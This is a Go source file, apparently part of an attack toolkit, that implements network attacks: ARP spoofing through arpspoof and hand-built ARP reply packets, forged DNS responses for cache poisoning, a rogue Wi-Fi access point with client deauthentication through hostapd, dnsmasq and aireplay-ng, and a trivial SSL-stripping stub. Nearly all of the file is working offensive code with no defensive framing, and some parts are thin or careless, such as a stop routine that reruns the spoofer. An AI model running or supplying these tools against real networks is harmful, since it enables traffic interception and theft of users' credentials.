package networkattacks

import (
	"encoding/binary"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

// F1 — ARP Spoofing
type ARPPoisoner struct {
	interfaceName string
	gatewayIP     string
	targetIP      string
	stopCh        chan struct{}
}

func NewARPPoisoner(iface, gateway, target string) *ARPPoisoner {
	return &ARPPoisoner{
		interfaceName: iface,
		gatewayIP:     gateway,
		targetIP:      target,
		stopCh:        make(chan struct{}),
	}
}

func (a *ARPPoisoner) Start() error {
	exec.Command("sysctl", "-w", "net.ipv4.ip_forward=1").Run()
	go func() {
		for {
			select {
			case <-a.stopCh:
				return
			default:
				exec.Command("arpspoof", "-i", a.interfaceName, "-t", a.targetIP, a.gatewayIP).Run()
				time.Sleep(2 * time.Second)
			}
		}
	}()
	return nil
}

func (a *ARPPoisoner) Stop() {
	close(a.stopCh)
	exec.Command("arpspoof", "-i", a.interfaceName, "-t", a.targetIP, a.gatewayIP).Run()
}

func (a *ARPPoisoner) BuildARPPacket(srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP) []byte {
	pkt := make([]byte, 42)
	for i := 0; i < 6; i++ {
		pkt[i] = 0xFF
	}
	copy(pkt[6:12], srcMAC)
	pkt[12] = 0x08
	pkt[13] = 0x06
	pkt[14] = 0x00
	pkt[15] = 0x01
	pkt[16] = 0x08
	pkt[17] = 0x00
	pkt[18] = 0x06
	pkt[19] = 0x04
	pkt[20] = 0x00
	pkt[21] = 0x02
	copy(pkt[22:28], srcMAC)
	copy(pkt[28:32], srcIP.To4())
	copy(pkt[32:38], dstMAC)
	copy(pkt[38:42], dstIP.To4())
	return pkt
}

// F2 — DNS Cache Poisoning
type DNSPoisoner struct{}

func NewDNSPoisoner() *DNSPoisoner {
	return &DNSPoisoner{}
}

func (d *DNSPoisoner) SpoofResponse(queryID uint16, domain string, spoofedIP net.IP) []byte {
	resp := make([]byte, 0)
	resp = binary.BigEndian.AppendUint16(resp, queryID)
	resp = binary.BigEndian.AppendUint16(resp, 0x8180)
	resp = binary.BigEndian.AppendUint16(resp, 0x0001)
	resp = binary.BigEndian.AppendUint16(resp, 0x0001)
	resp = binary.BigEndian.AppendUint16(resp, 0x0000)
	resp = binary.BigEndian.AppendUint16(resp, 0x0000)

	for _, part := range splitDomain(domain) {
		resp = append(resp, byte(len(part)))
		resp = append(resp, []byte(part)...)
	}
	resp = append(resp, 0x00)
	resp = binary.BigEndian.AppendUint16(resp, 0x0001)
	resp = binary.BigEndian.AppendUint16(resp, 0x0001)
	resp = binary.BigEndian.AppendUint16(resp, 0xC00C)
	resp = binary.BigEndian.AppendUint16(resp, 0x0001)
	resp = binary.BigEndian.AppendUint16(resp, 0x0001)
	resp = binary.BigEndian.AppendUint32(resp, 300)
	resp = binary.BigEndian.AppendUint16(resp, 0x0004)
	resp = append(resp, spoofedIP.To4()...)
	return resp
}

// F3 — Rogue AP
type RogueAP struct{}

func NewRogueAP() *RogueAP {
	return &RogueAP{}
}

func (r *RogueAP) StartRogueAP(ssid, iface string) error {
	conf := fmt.Sprintf(`interface=%s
ssid=%s
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=aresroguestationary
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
`, iface, ssid)
	exec.Command("sh", "-c", fmt.Sprintf("echo '%s' > /tmp/hostapd.conf", conf)).Run()
	exec.Command("hostapd", "/tmp/hostapd.conf").Start()
	exec.Command("sh", "-c", "echo '0.0.0.0'| dnsmasq -C /dev/null -d -i wlan0 --dhcp-range=192.168.1.2,192.168.1.100,12h").Start()
	return nil
}

func (r *RogueAP) Deauth(bssid, clientMAC string) error {
	exec.Command("aireplay-ng", "-0", "5", "-a", bssid, "-c", clientMAC, "wlan0").Run()
	return nil
}

// F5 — SSL Stripping
type SSLStripper struct{}

func NewSSLStripper() *SSLStripper {
	return &SSLStripper{}
}

func (s *SSLStripper) StripHTTPS(targetURL string) (string, error) {
	return strings.Replace(targetURL, "https://", "http://", 1), nil
}

func splitDomain(domain string) []string {
	var parts []string
	start := 0
	for i := 0; i < len(domain); i++ {
		if domain[i] == '.' {
			parts = append(parts, domain[start:i])
			start = i + 1
		}
	}
	if start < len(domain) {
		parts = append(parts, domain[start:])
	}
	return parts
}
